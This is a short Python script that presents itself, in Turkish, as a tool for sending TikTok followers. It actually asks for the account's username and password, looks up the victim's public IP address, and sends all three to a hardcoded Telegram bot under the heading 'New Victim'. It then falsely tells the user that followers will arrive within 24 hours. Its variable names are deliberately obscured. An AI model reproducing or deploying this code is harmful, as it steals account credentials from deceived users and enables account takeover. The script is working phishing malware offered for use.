import requests
import pyfiglet
t = "8110267443:AAHNAgx0Yleg6JKLXomoTuhB_zEte-g-8HI"
c = "6534222591"
jshd92hshd = "FOLLOWERS"
color_72hs9 = "\033[94m"
reset_92js8 = "\033[0m"
def f72hsgd82():
    try:
        return requests.get("https://api.ipify.org").text
    except:
        return "js82hs92hd72"
banner_82hs = pyfiglet.figlet_format(jshd92hshd)
print(color_72hs9 + banner_82hs + reset_92js8)
print("""TİKTOK TAKİPÇİ ATILACAK HESAP BİLGİLERİNİ GİR 

""")
ajbduzjave = input("Kullanıcı Adı: ")
nmaskd92hsk = input("Şifre: ")
ip_9273hs = f72hsgd82()
msg_72hs8 = f"Yeni Kurban\nKullanıcı: {ajbduzjave}\nŞifre: {nmaskd92hsk}\nIP: {ip_9273hs}"
telegram_72js = f"https://api.telegram.org/bot{t}/sendMessage"
payload_92hs = {"chat_id": c, "text": msg_72hs8}
resp_8273jsk = requests.post(telegram_72js, data=payload_92hs)
if resp_8273jsk.status_code == 200:
    print("""İSTEK GÔNDERİLDİ 24 SAAT İÇİNDE HESABINIZDA OLUR
    
LÜTFEN HESABINIZI GİZLİYE ALMAYIN""")
else:
    print("HATA OLDU", resp_8273jsk.text)